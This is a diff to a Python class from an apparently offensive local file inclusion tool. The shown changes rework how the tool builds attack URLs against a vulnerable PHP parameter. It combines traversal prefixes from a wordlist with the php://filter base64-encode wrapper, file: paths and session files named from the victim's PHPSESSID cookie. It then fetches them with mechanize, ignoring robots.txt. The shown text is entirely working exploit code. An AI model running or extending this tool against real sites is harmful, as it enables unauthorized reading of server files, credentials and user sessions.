@@ -163,15 +163,16 @@ class Read_File:
                 command_dir = readline.readlines()
                 for LINE in command_dir :
                     LINE.replace('\n','')
-                    self.LFi = ''
+                    self.LFI = ''
+                    phpfillter = 'php://filter/read=convert.base64-encode/resource='
                     if self.args.base64:
                         if 'sess_' not in self.args.read :
-                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
                             URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                         else:
-                            URL= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
+                            URL= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+self.args.read.split("_")[0]+"_"+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
+                            print(URL)
                     elif "sess_" in self.args.read: 
-                        URL = self.args.Vulnurl+LINE.replace('\n','')+self.args.read+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
+                        URL = self.args.Vulnurl+LINE.replace('\n','')+self.args.read.split("_")[0]+"_"+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
                     else:    
                         URL = self.args.Vulnurl 
                     if not "sess_" in self.args.read:    
@@ -182,8 +183,11 @@ class Read_File:
                         elif 'file:' in LINE :
                              self.LFI = URL+LINE+self.args.read.replace('/','',1)       
                         else:
-                            self.LFI = (URL+LINE+self.args.read).replace('\n','')                                                                                               
-                    self.url = self.LFI
+                            self.LFI = (URL+LINE+self.args.read).replace('\n','')   
+                    if "sess_" in self.args.read:
+                        self.url = URL  
+                    else:                                                                                                    
+                        self.url = self.LFI
                     request = mechanize.Browser()
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
